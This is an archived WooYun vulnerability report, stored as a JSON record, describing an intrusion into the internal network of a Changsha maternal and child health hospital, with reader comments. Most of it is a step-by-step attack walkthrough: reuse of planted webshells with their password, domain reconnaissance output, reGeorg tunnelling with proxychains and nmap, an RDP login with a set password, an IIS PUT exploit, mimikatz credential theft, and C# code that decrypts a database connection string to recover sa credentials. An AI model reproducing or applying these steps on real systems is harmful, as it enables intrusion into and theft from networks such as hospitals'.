{"id": 77969, "wybug_id": "wooyun-2015-0161432", "wybug_title": "长沙妇幼保健医院内网渗透（内网渗透入门案例）", "wybug_corp": "长沙妇幼保健医院", "wybug_author": "niexinming", "wybug_date": "2015-12-15 13:18", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 总是看到xsser加班，也是够拼的 详细说明：  首先，在**.**.**.**/处发现大量木马，随便找一只好了**.**.**.**/x.aspx 密码:xiaoma在里面我们先简单探查一下内网:执行cmd指令：ipconfig /all输出：Windows IP Configuration   Host Name . . . . . . . . . . . . : csfy-90b1c1c4a0   Primary Dns Suffix  . . . . . . . : **.**.**.**   Node Type . . . . . . . . . . . . : Unknown   IP Routing Enabled. . . . . . . . : No   WINS Proxy Enabled. . . . . . . . : No   DNS Suffix Search List. . . . . . : **.**.**.**Ethernet adapter 本地连接:   Connection-specific DNS Suffix  . :    Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection   Physical Address. . . . . . . . . : 00-50-56-9C-2D-55   DHCP Enabled. . . . . . . . . . . : No   IP Address. . . . . . . . . . . . : **.**.**.**   Subnet Mask . . . . . . . . . . . : **.**.**.**   Default Gateway . . . . . . . . . : **.**.**.**   DNS Servers . . . . . . . . . . . : **.**.**.**                                       **.**.**.**查看所在域的组net view /domain输出：FBY                  FZIH                 FZJH                 MSHOME               WORKGROUP            查看所在域用户net user /domain 输出：aaa                      admin                    admin1                   admin2                   admin3                   admin4                   admin5                   Administrator            ASPNET                   BBC                      BC2                      BC3                      BC4                      BC5                      cheshi                   clustadmin               DCS_FBYSVR3              emradin                  fjuser                   Guest                    HIS                      ID1                      ID10                     ID11                     ID12                     ID13                     ID14                     ID15                     ID16                     ID17                     ID18                     ID19                     ID2                      ID20                     ID21                     ID22                     ID23                     ID24                     ID25                     ID26                     ID27                     ID28                     ID29                     ID3                      ID30                     ID31                     ID32                     ID33                     ID34                     ID35                     ID36                     ID37                     ID38                     ID39                     ID4                      ID40                     ID41                     ID42                     ID43                     ID44                     ID45                     ID46                     ID47                     ID48                     ID49                     ID5                      ID50                     ID6                      ID7                      ID8                      ID9                      ID99                     IUSR_FBYSR1              IUSR_FBYSVR2             IUSR_FBYSVR3             IUSR_FBYSVR4             IUSR_X3850X5             IWAM_FBYSR1              IWAM_FBYSVR2             IWAM_FBYSVR3             IWAM_FBYSVR4             IWAM_X3850X5             krbtgt                   LIS                      lisadmin                 PACS                     RIS                      sqladmin                 SQLDebugger              test                     tie                      tjadmin                  TsInternetUser           vcsadmin                 win                      WWW                      xxkgl01                  xxkgl02                  xxkgl03                  yibao                    查看域管理员：net group /domain \"domain admins\"输出：成员-------------------------------------------------------------------------------Administrator            clustadmin               sqladmin                 vcsadmin                 win                我们这次的内网渗透是用linux下的：reGeorgSocksProxy.py+proxychainsreGeorgSocksProxy的下载地址：https://**.**.**.**/sensepost/reGeorgproxychains的下载，在ubuntu上直接是:sudo apt-get install proxychains配置：修改配置文件 sudo vim /etc/proxychains.conf 将[ProxyList]下的代理服务器信息修改下  如：socks5 **.**.**.** 1234首先我们利用小马或者大马上传把reGeorg里面自带的webshell上传到服务器里面：我上传的到的地址是：**.**.**.**/tunnel.aspx然后在ubuntu里面python reGeorgSocksProxy.py -p 1234 -u **.**.**.**/tunnel.aspx然后用proxychains+nmap扫描开3389的服务器：proxychains nmap -sT -p3389 **.**.**.**/24输出的结果是：**.**.**.**   iis put**.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.**  oa sql**.**.**.**  **.**.**.****.**.**.**    **.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.**一些信息收集好了之后就可以提权并且开这台主机的远程控制了，因为这个是在内网：所以： proxychains rdesktop -a 16 -u temp -p Admin#123 **.**.**.**\n\n然后我们在**.**.**.**发现一个网站：\n\n我发现有iisput漏洞：然后用iisput利用工具秒掉：拿到大马http://**.**.**.**/shell.aspx\n\n然后发现里面有sql server 然后利用sql server 的权限开了另一个账户进去：\n\n然后在里面运行mimikatz拿到域管理员的密码：\n\n然后域内的服务器随便我行走：\n\n后面加一些小点心，很有趣：**.**.**.**这台服务器的数据库连接字符串加了密<add key=\"conmdecrypt\" value=\"1O1/1Vq/h/2VTErYbMgFMngt9nZIhyMMpviYtT9StTawjkpKnv9fDGqf30pMxEk6H4Vu0Vj+GTY=\" />我于是下载了他们的WebService_yygh.dll，然后反编译了一下，找到这个\n\n跟踪getini(),发现这个：\n\n再跟踪md5Decrypt这个函数发现这个：\n\n然后我在E:\\kingstar\\ConnConfig\\ConnConfig.ini发现了这个：1O1/1Vq/h/0WlMwfuwM+jHw/Fh5rhQQoEr5tZ+tk1OTX7q171c6N6XA0ptSPMUyQ3ywr2i4EJag=然后我自己写了一个解密的程序：using System;using System.Security.Cryptography;using System.Text;using System.IO;public class Test{\tpublic static void Main()\t{\t    string text = null;\t\tbyte[] buffer = Encoding.Default.GetBytes(\"winning\");\t\tbyte[] array = Convert.FromBase64String(\"1O1/1Vq/h/0WlMwfuwM+jHw/Fh5rhQQoEr5tZ+tk1OTX7q171c6N6XA0ptSPMUyQ3ywr2i4EJag=\");        MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();        byte[] key = mD5CryptoServiceProvider.ComputeHash(buffer);\t\tTripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();\t\ttripleDESCryptoServiceProvider.Key = key;\t\ttripleDESCryptoServiceProvider.Mode = CipherMode.ECB;\t\ttext = Encoding.ASCII.GetString(tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length));\t\tConsole.WriteLine(text); \t}}结果：server=**.**.**.**;database=THIS4;uid=sa;pwd=5651011;然后用菜刀连接\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  清除木马   版权声明：转载请注明来源 niexinming@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-18 17:05 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖南分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-15 13:29 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  禽兽！！妇幼保健都不放过！    \n     2015-12-15 13:32 |    \t\tHackshy \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:23        | 猪猪侠爱吃棒棒糖)\t\t \n  我是来看教程的。    \n     2015-12-15 15:49 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:54        | little red pig!)\t\t \n  禽兽！！妇幼都不放过！     \n     2015-12-15 15:50 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:54        | little red pig!)\t\t \n  禽兽！！妇幼都不放过！     \n     2015-12-15 16:49 |    \t\tω电池ω \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | neusoft)\t\t \n  禽兽！！妇幼都不放过！    \n     2015-12-16 22:21 |    \t\tS4kur4 \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:16        | 你有本事开门啊！)\t\t \n  也是屌    \n     2015-12-18 08:56 |    \t\t404notfound \t\t\t( 普通白帽子  |\t\t\t        Rank:259 漏洞数:71        | 考研中，有事请留言)\t\t \n  禽兽！！妇幼都不放过！    \n     2016-02-02 14:54 |    \t\ttSt \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:30        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  禽兽！！妇幼都不放过！    \n     2016-02-20 21:06 |    \t\t情痴 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:12        | 乌云最菜的菜鸟)\t\t \n  禽兽！！妇幼都不放过！    \n     2016-02-28 10:47 |    \t\tShAdow丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        | i am a fans of kimYeWon.)\t\t \n  禽兽！！妇幼都不放过！     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}